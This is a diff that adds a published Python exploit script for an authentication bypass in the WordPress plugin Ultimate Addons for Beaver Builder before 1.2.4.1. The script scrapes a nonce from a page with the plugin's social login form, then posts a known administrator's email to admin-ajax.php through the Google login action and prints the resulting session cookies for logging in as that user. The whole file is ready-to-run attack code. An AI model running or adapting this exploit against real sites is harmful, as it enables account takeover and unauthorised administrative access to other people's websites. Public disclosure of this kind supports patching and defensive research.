@@ -1,0 +1,76 @@
+# Exploit Title: Wordpress Ultimate Addons for Beaver Builder 1.2.4.1 - Authentication Bypass
+# Date: 2019-12-21
+# Exploit Authors: Raphael Karger & Nathan Hrncirik
+# Vendor Homepage: https://www.ultimatebeaver.com/
+# Version: Ultimate Addons for Beaver Builder < 1.2.4.1
+'''
+
+Requirements:
+    * Valid Admin/User Email Needs to be Known
+    * Social Media Login Form has to be Embedded in the Specified URL
+
+'''
+
+#!/usr/bin/python3
+
+import requests
+import urllib.parse
+import json
+import argparse
+
+banner = r''' ____ ___  _____ _______________________________              .__         .__  __   
+|    |   \/  _  \\______   \______   \_   _____/__  _________ |  |   ____ |__|/  |_ 
+|    |   /  /_\  \|    |  _/|    |  _/|    __)_\  \/  /\____ \|  |  /  _ \|  \   __\
+|    |  /    |    \    |   \|    |   \|        \>    < |  |_> >  |_(  <_> )  ||  |  
+|______/\____|__  /______  /|______  /_______  /__/\_ \|   __/|____/\____/|__||__|  
+                \/       \/        \/        \/      \/|__|                         
+Ultimate Addons for Beaver Builder < 1.2.4.1 - Authentication Bypass
+'''
+
+class exploit(object):
+    def __init__(self, page, email):
+        self.page = page
+        self.sess = requests.Session()
+        self.email = email
+        self.nonce = False
+
+    def get_nonce(self):
+        try:
+            nonce_req = self.sess.get(self.page)
+            if nonce_req.text.find("data-nonce=") != -1:
+                self.nonce = nonce_req.text.split("data-nonce=")[1].split(">")[0]
+        except Exception as e:
+            print("Nonce Error: {}".format(e))
+
+    def auth_bypass(self):
+        try:
+            schema = urllib.parse.urlparse(self.page)
+            resp = self.sess.post("{}://{}/wp-admin/admin-ajax.php".format(schema.scheme, schema.netloc), data={
+                    "action" : "uabb-lf-google-submit",
+                    "name" : "raphaelrocks",
+                    "email" : self.email,
+                    "nonce" : self.nonce
+            })
+            if resp.status_code == 200:
+                print("Exploit Successful, Use the Cookies to Login: \n{}".format(
+                    json.dumps(self.sess.cookies.get_dict(), indent=4)
+                ))
+        except Exception as e:
+            print("Auth Bypass Error: {}".format(e))
+
+    def begin_exploit(self):
+        self.get_nonce()
+        if self.nonce:
+            print("Found Nonce: {}".format(self.nonce))
+            self.auth_bypass()
+        else:
+            print("Failed to Gather Nonce")
+
+if __name__ == "__main__":
+    print(banner)
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-e", "--email", dest="email", help="Email of Administrator User/Privileged User", required=True)
+    parser.add_argument("-u", "--url", dest="url", help="URL With Social Media Login Form", required=True)
+    args = parser.parse_args()
+    ex = exploit(args.url, args.email)
+    ex.begin_exploit()
